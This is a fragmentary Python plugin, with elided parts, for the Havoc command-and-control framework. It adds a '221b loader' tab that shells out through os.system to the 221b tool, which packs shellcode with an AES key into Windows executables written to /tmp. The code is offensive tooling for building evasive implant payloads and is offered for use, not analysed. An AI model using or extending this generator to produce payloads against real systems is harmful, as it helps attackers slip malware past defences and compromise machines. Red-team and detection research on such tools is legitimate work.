...
dialog = havocui.Dialog("Matro7sh 221b Payload Generator", True, 670, 300)
log = havocui.Logger("matro7sh 221b Log")
...
def execute(file):
    ...
    if baker_key == "":
        ...
        print(f'{loader_path} -s {shellcode_path} --out /tmp/myph.exe"')
    else:
        os.system(f'{loader_path}/221b bake -m aes -k {baker_key} -s {shellcode_path} -o /tmp/bake.exe')
        print(f'{loader_path} -k {baker_key} -s {shellcode_path} --out /tmp/bake.exe')
...
# Create Tab
havocui.createtab("Matro7sh 221b", "221b loader menu", loader_generator)
